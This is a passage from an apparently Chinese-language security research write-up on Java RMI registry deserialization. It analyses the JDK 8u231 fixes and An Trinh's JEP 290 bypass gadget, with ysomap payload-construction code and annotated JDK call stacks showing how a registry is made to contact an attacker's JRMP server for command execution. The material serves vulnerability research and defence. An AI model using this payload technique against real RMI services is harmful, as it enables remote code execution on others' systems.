            java.rmi.server.Operation[] operations = (Operation[]) ReflectionHelper.getFieldValue(registry, "operations");
            try {
            ....//之后就跟原来的lookup一样了
                //同时这里我还加入了绕过enableReplace，使UnicastRemoteObject可用
### 8u231的修复
选取了两个版本8u211b12和8u231b11进行测试，使用自定义类的payload模块，8u211可以攻击，8u231不能攻击。
> 其中8u231b11版本是从Oracle官网下载的。
>
> 如果从openjdk中查找更新的具体版本，那就是8u232b09（感谢wh1t3p1g）
>
> 其实一直没搞懂为啥这个版本号的问题，为啥openjdk里没有8u231呢，如果有人知道希望可以回复我谢谢。
先看测试结果。
对比JDK做了两处修复：
  1. `sun.rmi.registry.RegistryImpl_Skel#dispatch`报错情况消除ref
  2. `sun.rmi.transport.DGCImpl_Stub#dirty`提前了黑名单
#### 第一处修复
>
> 在openjdk中可以在线查看对比[8u232u8的RegistryImpl_Skel.java](https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/69c4f673b33e/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java)与[8u232u9的RegistryImpl_Skel.java](https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5456f24496f4/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java)
其实只有一行的区别，在每个动作比如lookup，bind等中都添加了一个逻辑：
**如果出现了序列化报错都会进入catch，执行`discardPedingRefs`**。
在`sun.rmi.transport.StreamRemoteCall#discardPendingRefs`中其实也就是做了一件事情，把我们之前装载的`incomingRefTable`清空
    public void discardPendingRefs() {
        this.in.discardRefs();//去下面
    }
    //sun.rmi.transport.ConnectionInputStream#discardRefs
    void discardRefs() {
        this.incomingRefTable.clear();//消除incomingRefTable里面我们的ref
    }
那么很清楚假如我们的payload在序列化中发生了报错，那么我们想尽办法装载的ref就会被干掉。再回头看看我们的那么多种payload都会报错么？
  1. **自定义类（动态代理或接口）** ：报错ClassNotFoundException
因为我们传入的类虽然会完成装载，但是在后续的序列化逻辑中肯定是会因为找不到我们的恶意类而发生ClassNotFoundException报错的。
被干掉了。
  2. **动态代理转换接口或者找内置接口** ：报错ClassCastException
而其他的payload虽然因为都是有内置类的，这些内置类在序列化的时候`var9.readObject();`是没问题的。
但是这里还有一个类型转换的逻辑`var8 = (String)var9.readObject();`在类型转换的时候就会发生报错。
从而也被干掉了。
#### 第二处修复
实际上第一处修复已经完美修复了，但是还有第二处修复针对的是ref被触发的时候，即`var7.releaseInputStream();`
回顾`UnicastRef对象`这一小节，重新看我们POC触发的调用栈图的左下角，它必定会经过`sun.rmi.transport.DGCImpl_Stub#dirty`
>
> 在openjdk中可以在线查看对比[8u232u8的DGCImpl_Stub.java](https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/69c4f673b33e/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java)与[8u232u9的DGCImpl_Stub.java](https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5456f24496f4/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java)
在dirty方法中三个关键语句：
  1. `this.ref.newCall`：发起JRMP请求
  2. `var6.setObjectInputFilter(DGCImpl_Stub::leaseFilter);`：过滤
  3. `this.ref.invoke()`：触发JRMP返回payload反序列化解析
把过滤器放在解析之前，那么JRMP请求是可以发起的，但是你最后命令执行的payload（比如CC）会被过滤器给干掉。
看下过滤器`sun.rmi.transport.DGCImpl_Stub#leaseFilter`：一样对长度、深度、黑名单做了限制
我们的payload用的是CC链，不在白名单范围内，于是GG。
    if (var1.isPrimitive()) {
        return Status.ALLOWED;
    } else {
        return var1 != UID.class && var1 != VMID.class && var1 != Lease.class && (var1.getPackage() == null || !Throwable.class.isAssignableFrom(var1) || !"java.lang".equals(var1.getPackage().getName()) && !"java.rmi".equals(var1.getPackage().getName())) && var1 != StackTraceElement.class && var1 != ArrayList.class && var1 != Object.class && !var1.getName().equals("java.util.Collections$UnmodifiableList") && !var1.getName().equals("java.util.Collections$UnmodifiableCollection") && !var1.getName().equals("java.util.Collections$UnmodifiableRandomAccessList") && !var1.getName().equals("java.util.Collections$EmptyList") ? Status.REJECTED : Status.ALLOWED;
    }
## 来自An Trinh的另一种绕过JEP290的思路
今年2月份，[An Trinh的RMI注册端的Bypass方法](https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/)一文中提出了一种新的Bypass思路，这是一条 **与众不同的而又"鸡肋"** 的Gadgets。
> 上面这句话是一天前年幼无知的我写的，大胆而又无知的说"鸡肋"。一天之后回来想删掉，但是想想还是放着在下面打脸好了。
>
> 这条链比之前的都要牛逼可以继续绕过231修复，先按照这个思路看下去，提前膜拜大An Trinh佬。
为什么要说鸡肋呢，先回顾一下我们之前是如何绕过JEP290的：
**攻击者发送payload让RMI注册端发起一个JRMP请求去链接我们的JRMP服务器，然后接受并反序列化我们JRMP服务器返回的报错信息，反序列化的时候通过RMI注册端内部的利用链（比如CC）完成命令执行**
An Trinh的绕过思路还是这个套路，JRMP的部分一模一样没有改变，与我们之前不同的是 **如何让RMI注册端发起JRMP请求这一部分** 。
之前我们提出许多许多攻击方式：绕过客户端-自实现协议去封装、动态代理、UnicastRef类型参数实现Remote接口的类等等、甚至可以自定义一个符合要求的类来攻击。
但是回归到这些攻击方式，其本质都是利用：
  1. **readobject反序列化的过程会递归反序列化我们的对象，一直反序列化到我们的UnicastRef类。**
  2. **在readobejct反序列化的过程中填装UnicastRef类到`incomingRefTable`**
  3. **在releaseInputStream语句中从incomingRefTable中读取ref进行开始JRMP请求**
(后两步是发起JRMP请求的细节，在 UnicastRef对象 一节中有详细说到，可以粗糙的理解成readobject出发了JRMP查询也没事)
在这个本质的基础上，我们所做的、所解决的问题只是在：选择UnicastRef类包装或者不包装（包装是为了迎合JDK客户端底层的代码）、用jdk中已有的类包装还是自定义类包装，或者用动态代理包装还是原生接口包装，又再是用什么原生接口包装，有的包装不好用怎么办？巴拉巴拉的在处理这些问题。
* * *
但是An Trinh提出了一个新的思路来发起JRMP请求，不是利用 **readobject的递归-填装-触发** 的模式，而是
**readobject函数调用过程** 直接触发JRMP请求。
但是为什么说他鸡肋呢？因为他的payload攻击过程中：会 **在readobject函数中触发他的Gadgets发起JRMP连接**
，但是在完成后，又会回到我们的 **readobject的递归-填装-触发** 的模式中发起第二次JRMP连接。具体流程如下：
  1. **readobject递归反序列化到payload对象中的UnicastRef对象，填装UnicastRef对象的ref到`incomingRefTable`**
  2. **在根据readobject的第二个最著名的特性：会调用对象自实现的readobject方法，会执行UnicastRemoteObject的readObject，他的Gadgets会在这里触发一次JRMP请求**
  3. **在releaseInputStream语句中从`incomingRefTable`中读取ref进行开始JRMP请求**
同时他Gadgets发起JRMP请求只会发起 **一次请求** ，而readobject的递归-填装-触发的JRMP请求，由于会检测DGC是否绑定成功会
**循环发起JRMP** ，形成天然的心跳木马。
那么这样对比看起来这个Gadgets就有一种画蛇添足的感觉，一种混KPI的鸡肋优雅感（ ~~天呐一天前的我竟然得出了如此羞耻的结论，辣鸡的傲慢~~
），这就是安全研究员么，爱了爱了。
但是反正让我找我是找不出来的，我们就来膜拜看看他的链在UnicastRemoteObject的readObject中是怎么做到JRMP请求的。
先给出ysomap里的封装过程：
    public UnicastRemoteObject pack(Object obj) throws Exception {
        //1.UnicastRef对象 -> RemoteObjectInvocationHandler
        //obj是UnicastRef对象，先RemoteObjectInvocationHandler封装
        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler((RemoteRef) obj);
        //2. RemoteObjectInvocationHandler -> RMIServerSocketFactory接口
        //RemoteObjectInvocationHandler通过动态代理封装转化成RMIServerSocketFactory
        RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(
            RMIServerSocketFactory.class.getClassLoader(),// classloader
            new Class[] { RMIServerSocketFactory.class, Remote.class}, // interfaces to implements
            handler// RemoteObjectInvocationHandler
            );
        //通过反射机制破除构造方法的可见性性质，创建UnicastRemoteObject实例
        Constructor constructor = UnicastRemoteObject.class.getDeclaredConstructor(null); // 获取默认的
        constructor.setAccessible(true);
        UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(null);
        //3. RMIServerSocketFactory -> UnicastRemoteObject
        //把RMIServerSocketFactory塞进UnicastRemoteObject实例中
        ReflectionHelper.setFieldValue(remoteObject, "ssf", serverSocketFactory);
        return remoteObject;
    }
看下漏洞触发调用栈，主要分成三个关键点：
从UnicastRemoteObject的readObject入口开始`java.rmi.server.UnicastRemoteObject#readObject`：
    private void readObject(java.io.ObjectInputStream in)
            throws java.io.IOException, java.lang.ClassNotFoundException
        {
            in.defaultReadObject();
            reexport();//这里
        }
`java.rmi.server.UnicastRemoteObject#reexport`:
    private void reexport() throws RemoteException
        {
            if (csf == null && ssf == null) {
                exportObject((Remote) this, port);
            } else {
                //payload是填充了ssf的,这里
                exportObject((Remote) this, port, csf, ssf);
            }
        }
之后的调用链很长我们直接跳到`sun.rmi.transport.tcp.TCPEndpoint#newServerSocket`这里是第二个关键处动态代理的特性，跳转到拦截器的invoke（这里的动态代理是不仅用到了接口转换的特性，用到了拦截的特性！惊了！激动！）
`sun.rmi.transport.tcp.TCPEndpoint#newServerSocket`：
    ServerSocket newServerSocket() throws IOException {
        if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {
            TCPTransport.tcpLog.log(Log.VERBOSE, "creating server socket on " + this);
        }
        Object var1 = this.ssf;
        if (var1 == null) {
            var1 = chooseFactory();
        }
        //var1就是我们的payload中构建的ssf.调用他的createServerSocket
        //会根据动态代理进入RemoteObjectInvocationHandler#invoke
        ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(this.listenPort);
        if (this.listenPort == 0) {
            setDefaultPort(var2.getLocalPort(), this.csf, this.ssf);
        }
`java.rmi.server.RemoteObjectInvocationHandler#invoke`：
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable
        {
        //method是java.rmi.server.RMIServerSocketFactory的createServerSocket方法
            //....
            //这边都不满足
            if (method.getDeclaringClass() == Object.class) {
                return invokeObjectMethod(proxy, method, args);
            } else if ("finalize".equals(method.getName()) && method.getParameterCount() == 0 &&
                !allowFinalizeInvocation) {
                return null; // ignore
            } else {
                //进入此处
                return invokeRemoteMethod(proxy, method, args);
            }
        }
`java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod`：
    private Object invokeRemoteMethod(Object proxy,
                                      Method method,
                                      Object[] args)
        throws Exception
        {
            try {
                if (!(proxy instanceof Remote)) {
                    throw new IllegalArgumentException(
                        "proxy not Remote instance");
                }
              //我们payload把RemoteObjectInvocationHandler的ref写成了JRMP恶意服务器地址
              //这里开始了触发JRMP请求
                return ref.invoke((Remote) proxy, method, args,
                                  getMethodHash(method));
            } catch (Exception e) {
令人激动的`sun.rmi.server.UnicastRef#invoke`我们之前JRMP触发就是在这里触发的，但是之前是`sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)`虽然接口是不一样，但是做的事情差不多
`sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method,
java.lang.Object[], long)`
    public Object invoke(Remote var1, Method var2, Object[] var3, long var4) throws Exception {
            //省略部分代码...  
            //从ref中获取连接
            Connection var6 = this.ref.getChannel().newConnection();
            StreamRemoteCall var7 = null;
            boolean var8 = true;
            boolean var9 = false;
            Object var13;
            try {
                if (clientRefLog.isLoggable(Log.VERBOSE)) {
                    clientRefLog.log(Log.VERBOSE, "opnum = " + var4);